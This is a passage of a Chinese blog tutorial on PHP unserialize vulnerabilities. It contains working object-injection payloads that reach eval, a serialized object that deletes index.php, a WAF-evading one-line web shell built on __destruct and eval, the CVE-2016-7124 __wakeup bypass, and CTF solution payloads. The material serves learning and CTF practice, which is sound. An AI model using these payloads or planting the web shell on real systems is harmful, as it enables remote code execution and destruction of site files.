class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//得到：O:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//手动修改一下：O:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/02/.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="恶意删除index-php等重要文件"><a href="#恶意删除index-php等重要文件" class="headerlink" title="恶意删除index.php等重要文件"></a>恶意删除index.php等重要文件</h3><p>某个web应用程序中，log.php用来产生临时profile.log(比如用户修改个人信息,修改完(__destruct被调用)就删除这个临时日志)，目录假如就是根目录，即存在index.php  前提log.php泄露，然后修改用户信息时得知反序列化传参可控，而且也用到了临时日志。</p>
<p>那么实验开始：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//创建日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor删除日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这是一个使用log.php的简单例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span>    <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;    <br><span class="hljs-comment">// 创建一个对象      </span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();    <br><span class="hljs-comment">// 设置文件名和要储存的日志数据    </span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;    <br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);    <br><span class="hljs-comment">// 脚本结束__destruct被调用somefile.log文件被删除  </span><br></code></pre></td></tr></table></figure>

<p>注释掉log.php中的__destructor() 如下</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703014308067.png" srcset="/img/loading.gif" lazyload></p>
<p>访问test.php</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703015954924.png" srcset="/img/loading.gif" lazyload></p>
<p>产生了somefile.log文件</p>
<p>恢复__destructor() 就观察不到这个创建和删除的过程</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703020204896.png" srcset="/img/loading.gif" lazyload></p>
<p>但经过上面的测试 说明log.php可用</p>
<p>接下来继续</p>
<p>该网站有其他功能点，也是需要创建临时日志文件的，所以包含了同一个生成日志的类  比如更新用户信息 下面示例代码不含更新操作，显示一下就ok了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//提供反序列化的接口文件 profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;    <br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;    <br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>	&#125;<br>&#125;        <br><span class="hljs-comment">// 重建用户输入的数据    </span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php 注意，直接访问此文件index.php也会被删除</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//上面已经提到log.php已经泄露，故可以如此构造</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//输出：O:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703014910163.png" srcset="/img/loading.gif" lazyload></p>
<p>index.php文件存在可访问</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703020742097.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210703021610114.png" srcset="/img/loading.gif" lazyload></p>
<p>可见 index.php被成功删除</p>
<h3 id="过WAF一句话的尝试"><a href="#过WAF一句话的尝试" class="headerlink" title="过WAF一句话的尝试"></a>过WAF一句话的尝试</h3><p>某些情况下 对一句话木马变种</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// 构造序列化对象</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// 反序列化同时触发_destruct函数</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210612155638097.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ctf题"><a href="#ctf题" class="headerlink" title="ctf题"></a>ctf题</h2><h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup的绕过）"><a href="#CVE-2016-7124-wakeup的绕过）" class="headerlink" title="CVE-2016-7124(__wakeup的绕过）"></a>CVE-2016-7124(__wakeup的绕过）</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行。</strong></p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>利用如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destruct已经赋值$key=flag 而__wakeup又把变量给覆盖</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; 绕过__wakeup</span><br></code></pre></td></tr></table></figure>

<h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h4><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();  <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//手动修改特殊字符以及绕过__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br>    <br>    <br><span class="hljs-comment">//有时是url的get传参 那么就可以使用url编码 省去修改特殊字符的操作</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);    </span><br><span class="hljs-comment">//var_dump(urlencode($a));    </span><br></code></pre></td></tr></table></figure>

<h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>查看图片元素得到<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p>
<p>img后面的猜是base64  解码后是shield.jpg</p>
<p>不断改变base64的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br>		<span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br>		<span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>		&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>			readfile(<span class="hljs-variable">$f</span>);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>		&#125;<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>直接这样读取pctf.php返回file not found</p>
<p>构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span 